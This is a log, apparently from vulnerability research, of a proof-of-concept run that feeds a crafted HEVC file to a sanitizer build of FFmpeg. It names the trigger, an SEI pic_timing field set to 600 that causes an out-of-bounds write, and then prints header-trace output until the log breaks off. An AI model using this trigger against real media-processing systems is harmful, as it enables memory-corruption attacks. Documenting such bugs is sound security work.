[*] Generating crafted HEVC bitstream...
[+] Written 193 bytes to /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_cbs_h265_c/vuln_001_input.hevc
    VPS RBSP:  18 bytes
    SPS RBSP:  39 bytes
    PPS RBSP:  5 bytes
    SEI RBSP:  83 bytes  (payload=80 bytes, 601 DU entries)
    IDR stub:  2 bytes  (picture NAL to trigger packet)
    AUD stub:  1 bytes  (flushes previous packet)
[+] SEI pic_timing: num_decoding_units_minus1=600
    Loop writes num_nalus_in_du_minus1[0..600] (601 elements)
    Array bound: HEVC_MAX_SLICE_SEGMENTS=600 (indices 0..599)
    OOB write at index 600 (1 past end of array)

[*] Running FFmpeg with trace_headers BSF (CBS path) to trigger OOB write...
ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
  libavutil      61.  7.100 / 61.  7.100
  libavcodec     63. 11.100 / 63. 11.100
  libavformat    63.  6.100 / 63.  6.100
  libavdevice    63.  2.100 / 63.  2.100
  libavfilter    12.  4.100 / 12.  4.100
  libswscale     10.  2.100 / 10.  2.100
  libswresample   7.  3.100 /  7.  3.100
[hevc @ 0x519000000a80] Unknown slice type: 32.
[hevc @ 0x519000000a80] Unknown slice type: -1.
[hevc @ 0x519000000a80] Skipping invalid undecodable NALU: 19
[hevc @ 0x519000000a80] missing picture in access unit with size 7
[in#0/hevc @ 0x517000000080] Could not find codec parameters for stream 0 (Video: hevc (Main), none, 64x64): unspecified pixel format
Consider increasing the value for the 'analyzeduration' (0) and 'probesize' (5000000) options
Input #0, hevc, from 'vuln_001_input.hevc':
  Duration: N/A, bitrate: N/A
  Stream #0:0: Video: hevc (Main), none, 64x64, 25 fps, 30 tbr, 1200k tbn
[trace_headers @ 0x50e000000800] Extradata
[trace_headers @ 0x50e000000800] Video Parameter Set
[trace_headers @ 0x50e000000800] 0           forbidden_zero_bit                                          0 = 0
[trace_headers @ 0x50e000000800] 1           nal_unit_type                                          100000 = 32
[trace_headers @ 0x50e000000800] 7           nuh_layer_id                                           000000 = 0
[trace_headers @ 0x50e000000800] 13          nuh_temporal_id_plus1                                     001 = 1
[trace_headers @ 0x50e000000800] 16          vps_video_parameter_set_id                               0000 = 0
[trace_headers @ 0x50e000000800] 20          vps_base_layer_internal_flag                                1 = 1
[trace_headers @ 0x50e000000800] 21          vps_base_layer_available_flag                               1 = 1
[trace_headers @ 0x50e000000800] 22          vps_max_layers_minus1                                  000000 = 0
[trace_headers @ 0x50e000000800] 28          vps_max_sub_layers_minus1                                 000 = 0
[trace_headers @ 0x50e000000800] 31          vps_temporal_id_nesting_flag                                1 = 1
[trace_headers @ 0x50e000000800] 32          vps_reserved_0xffff_16bits                   1111111111111111 = 65535
[trace_headers @ 0x50e000000800] 48          general_profile_space                                      00 = 0
[trace_headers @ 0x50e000000800] 50          general_tier_flag                                           0 = 0
[trace_headers @ 0x50e000000800] 51          general_profile_idc                                     00001 = 1
[trace_headers @ 0x50e000000800] 56          general_profile_compatibility_flag[0]                       0 = 0
[trace_headers @ 0x50e000000800] 57          general_profile_compatibility_flag[1]                       1 = 1
[trace_headers @ 0x50e000000800] 58          general_profile_compatibility_flag[2]                       0 = 0
[trace_headers @ 0x50e000000800] 59          general_profile_compatibility_flag[3]                       0 = 0
[trace_headers @ 0x50e000000800] 60          general_profile_compatibility_flag[4]                       0 = 0
[trace_headers @ 0x50e000000800] 61          general_profile_compatibility_flag[5]                       0 = 0
[trace_headers @ 0x50e000000800] 62          general_profile_compatibility_flag[6]                       0 = 0
[trace_headers @ 0x50e000000800] 63          general_profile_compatibility_flag[7]                       0 = 0
[trace_headers @ 0x50e000000800] 64          general_profile_compatibility_flag[8]                       0 = 0
[trace_headers @ 0x50e000000800] 65          general_profile_compatibility_flag[9]                       0 = 0
[trace_headers @ 0x50e000000800] 66          general_profile_compatibility_flag[10]                      0 = 0
[trace_headers @ 0x50e000000800] 67          general_profile_compatibility_flag[11]                      0 = 0
[trace_headers @ 0x50e000000800] 68          general_profile_compatibility_flag[12]                      0 = 0
[trace_headers @ 0x50e000000800] 69          general_profile_compatibility_flag[13]                      0 = 0
[trace_headers @ 0x50e000000800] 70          general_profile_compatibility_flag[14]                      0 = 0
[trace_headers @ 0x50e000000800] 71          general_profile_compatibility_flag[15]                      0 = 0
[trace_headers @ 0x50e000000800] 72          general_profile_compatibility_flag[16]                      0 = 0
[trace_headers @ 0x50e000000800] 73          general_profile_compatibility_flag[17]                      0 = 0
[trace_headers @ 0x50e000000800] 74          general_profile_compatibility_flag[18]                      0 = 0
[trace_headers @ 0x50e000000800] 75          general_profile_compatibility_flag[19]                      0 = 0
[trace_headers @ 0x50e000000800] 76          general_profile_compatibility_flag[20]                      0 = 0
[trace_headers @ 0x50e000000800] 77          general_profile_compatibility_flag[21]                      0 = 0
[trace_headers @ 0x50e000000800] 78          general_profile_compatibility_flag[22]                      0 = 0
[trace_headers @ 0x50e000000800] 79          general_profile_compatibility_flag[23]                      0 = 0
[trace_headers @ 0x50e000000800] 80          general_profile_compatibility_flag[24]                      0 = 0
[trace_headers @ 0x50e000000800] 81          general_profile_compatibility_flag[25]                      0 = 0
[trace_headers @ 0x50e000000800] 82          general_profile_compatibility_flag[26]                      0 = 0
[trace_headers @ 0x50e000000800] 83          general_profile_compatibility_flag[27]                      0 = 0
[trace_headers @ 0x50e000000800] 84          general_profile_compatibility_flag[28]                      0 = 0
[trace_headers @ 0x50e000000800] 85          general_profile_compatibility_flag[29]                      0 = 0
[trace_headers @ 0x50e000000800] 86          general_profile_compatibility_flag[30]                      0 = 0
[trace_headers @ 0x50e000000800] 87          general_profile_compatibility_flag[31]                      0 = 0
[trace_headers @ 0x50e000000800] 88          general_progressive_source_flag                             1 = 1
[trace_headers @ 0x50e000000800] 89          general_interlaced_source_flag                              0 = 0
[trace_headers @ 0x50e000000800] 90          general_non_packed_constraint_flag                          0 = 0
[trace_headers @ 0x50e000000800] 91          general_frame_only_constraint_flag                          0 = 0
[trace_headers @ 0x50e000000800] 92          general_reserved_zero_43bits         000000000000000000000000 = 0
[trace_headers @ 0x50e000000800] 116         general_reserved_zero_43bits              0000000000000000000 = 0
[trace_headers @ 0x50e000000800] 135         general_inbld_flag                                          0 = 0
[trace_headers @ 0x50e000000800] 136         general_level_idc                                    00011110 = 30
[trace_headers @ 0x50e000000800] 144         vps_sub_layer_ordering_info_present_flag                    0 = 0
[trace_headers @ 0x50e000000800] 145         vps_max_dec_pic_buffering_minus1[0]                       010 = 1
[trace_headers @ 0x50e000000800] 148         vps_max_num_reorder_pics[0]                                 1 = 0
[trace_headers @ 0x50e000000800] 149         vps_max_latency_increase_plus1[0]                           1 = 0
[trace_headers @ 0x50e000000800] 150         vps_max_layer_id                                       000000 = 0
[trace_headers @ 0x50e000000800] 156         vps_num_layer_sets_minus1                                   1 = 0
[trace_headers @ 0x50e000000800] 157         vps_timing_info_present_flag                                0 = 0
[trace_headers @ 0x50e000000800] 158         vps_extension_flag                                          0 = 0
[trace_headers @ 0x50e000000800] 159         rbsp_stop_one_bit                                           1 = 1
[trace_headers @ 0x50e000000800] Sequence Parameter Set
[trace_headers @ 0x50e000000800] 0           forbidden_zero_bit                                          0 = 0
[trace_headers @ 0x50e000000800] 1           nal_unit_type                                          100001 = 33
[trace_headers @ 0x50e000000800] 7           nuh_layer_id                                           000000 = 0
[trace_headers @ 0x50e000000800] 13          nuh_temporal_id_plus1                                     001 = 1
[trace_headers @ 0x50e000000800] 16          sps_video_parameter_set_id                               0000 = 0
[trace_headers @ 0x50e000000800] 20          sps_max_sub_layers_minus1                                 000 = 0
[trace_headers @ 0x50e000000800] 23          sps_temporal_id_nesting_flag                                1 = 1
[trace_headers @ 0x50e000000800] 24          general_profile_space                                      00 = 0
[trace_headers @ 0x50e000000800] 26          general_tier_flag                                           0 = 0
[trace_headers @ 0x50e000000800] 27          general_profile_idc                                     00001 = 1
[trace_headers @ 0x50e000000800] 32          general_profile_compatibility_flag[0]                       0 = 0
[trace_headers @ 0x50e000000800] 33          general_profile_compatibility_flag[1]                       1 = 1
[trace_headers @ 0x50e000000800] 34          general_profile_compatibility_flag[2]                       0 = 0
[trace_headers @ 0x50e000000800] 35          general_profile_compatibility_flag[3]                       0 = 0
[trace_headers @ 0x50e000000800] 36          general_profile_compatibility_flag[4]                       0 = 0
[trace_headers @ 0x50e000000800] 37          general_profile_compatibility_flag[5]                       0 = 0
[trace_headers @ 0x50e000000800] 38          general_profile_compatibility_flag[6]                       0 = 0
[trace_headers @ 0x50e000000800] 39          general_profile_compatibility_flag[7]                       0 = 0
[trace_headers @ 0x50e000000800] 40          general_profile_compatibility_flag[8]                       0 = 0
[trace_headers @ 0x50e000000800] 41          general_profile_compatibility_flag[9]                       0 = 0
[trace_headers @ 0x50e000000800] 42          general_profile_compatibility_flag[10]                      0 = 0
[trace_headers @ 0x50e000000800] 43          general_profile_compatibility_flag[11]                      0 = 0
[trace_headers @ 0x50e000000800] 44          general_profile_compatibility_flag[12]                      0 = 0
[trace_headers @ 0x50e000000800] 45          general_profile_compatibility_flag[13]                      0 = 0
[trace_headers @ 0x50e000000800] 46          general_profile_compatibility_flag[14]                      0 = 0
[trace_headers @ 0x50e000000800] 47          general_profile_compatibility_flag[15]                      0 = 0
[trace_headers @ 0x50e000000800] 48          general_profile_compatibility_flag[16]                      0 = 0
[trace_headers @ 0x50e000000800] 49          general_profile_compatibility_flag[17]                      0 = 0
[trace_headers @ 0x50e000000800] 50          general_profile_compatibility_flag[18]                      0 = 0
[trace_headers @ 0x50e000000800] 51          general_profile_compatibility_flag[19]                      0 = 0
[trace_headers @ 0x50e000000800] 52          general_profile_compatibility_flag[20]                      0 = 0
